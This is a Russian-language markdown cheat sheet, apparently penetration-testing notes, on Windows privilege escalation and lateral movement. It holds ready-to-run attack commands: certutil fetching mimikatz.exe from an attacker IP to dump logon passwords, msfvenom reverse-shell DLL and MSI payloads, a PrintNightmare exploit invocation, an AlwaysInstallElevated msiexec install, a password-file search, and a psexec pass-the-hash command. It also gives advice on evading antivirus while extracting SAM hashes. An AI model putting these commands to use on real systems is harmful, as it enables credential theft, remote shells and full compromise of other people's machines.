## Способы повышений привилегий в Windows

### 1) Поиск секретов в OS Windows
- Можно найти неправильно настроенные менеджеры паролей и взломать их
- Посмотреть логи и истории команд, вытащить от туда чувствительные данные
- Вытащить из оперативной памяти (процессов) [[[Mimikatz]]](https://github.com/ParrotSec/mimikatz/tree/master)
- Найти файл, в котором хранятся хэши
- Вытащить учетки из конфигураций групповых политик
- Использовать скрипты-энумераторы

`cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config`

##### [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master)
1) Загрузка 
	`certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe m.exe`
2) Установка привилегий
	`privilege::debug`
3) Поиск паролей и хэшей
	`sekurlsa::logonPasswords`

### 2)  Эксплуатация известных уязвимостей OS Windows

#### Хранилище известных Windows уязвимостей
[Windows Vulnerabilities](https://msrc.microsoft.com/update-guide/vulnerability)

#### **Уязвимость в Windows Print Spooler (PrintNightmare)**

 В Windows по умолчанию включена служба Windows Print Spooler, позволяющая отправлять задания на печать

##### Поиск уязвимости
1) Найти процесс `spoolsv` (ps)
2) Убедиться в доступе к сервису по TCP
	`rpcdump.py @10.10.10.175 | egrep 'MS-RPRN|MS-PAR'`
3.1) Мы можем загрузить DLL и выполнить ее от имени СИСТЕМЫ
	`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1337 -f dll -o /tmp/print.dll`
3.2) Или выполнить [Эксплоит](https://github.com/cube0x0/CVE-2021-1675)
	`python3 ./CVE-2021-1675.py example.local/Alex:HappyHacking@192.168.0.134 '\\192.168.0.177\share\print.dll'`

### 3) Эксплуатация неправильных настроек конфигурации в OS Windows

**ПОВЫШЕНИЕ ПРИВИЛЕГИЙ ЧЕРЕЗ:**
1) Права на создание резервных копий *(SeBackupPrivilege)*
2) Права на установку ПО *(AlwaysInstallElevated)*
3) Подмену DLL Библиотек *(DLL Hijacking)*
4) Изменение пути бинарника сервиса *(Service Binary Path)*
5) Перехват сервиса *(Weak Services Permission)*
6) Имперсонификацию (выдачу себя за другого) *(SeImpersonatePrivilege)*
7) Неэкранированные пути сервисов *(Unquoted Service Paths)*

#### AlwaysInstallElevated
`HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

При установлении этих ключей в `1` мы можем загружать `.msi` и повыситься до **СИСТЕМЫ (SYSTEM)**

##### **Эксплуатация через Metasploit**
1) Генерируем payload
	`msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST={victim_ip} LPORT=443 -f msi -o {filename}.msi`

2)  Запуск установщика `.msi`
	`msiexec /quiet /qn /i rev.msi`

## Горизонтальное перемещение

### Представляет собой сочетание двух техник:
- Извлечение информации с машины после компрометации
- Аутентифицированное RCE

NTLM-хэши хранятся в реестре ``HKLM\sam`` в папке `С:\Windows\System32\config\SAM`, доступ к ним имеет только СИСТЕМА

Лучше практикой является извлечение системных файлов с помощью встроенных компонентов OS, а уже их анализ локально на машине, тем самым не вызывая AV.

При сборе информации мы собираем такую инфу из файла
`Username:RID:LM-hash:NTLM-hash:::`

Отсюда нам интересны именно NTLM

> Помимо этого эти хэши дополнительно шифруются алгоритмом RC4, с помощь "системного ключа" bootkey, сгенерированного утилитой syskey,


- И LM-, и NTLM-хеши могут быть также найдены и для доменных пользователей при анализе памяти lsass.exe или в базе ntds.dit.
- Они никогда не передаются по сети как есть, вместо этого они транслируются в виде NetNTLM/NetNTLMv2-хешей, которые непригодны для атаки [[Pass-the-Hash]].
* Данные типы хешей одноразовые и могут быть использованы только в момент передачи (техника NTLM-relay).

### **Pass the Hash (PtH)**

Атака Pass the Hash заключается в том, чтобы обойти этапы, в которых необъодимо предоставлять пароль, а перейти сразу к предоставлению хэша

``
```sh
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc example.local/Administrator@10.129.177.234 whoami
```


### **Выполнение кода на узле с учетной записью**
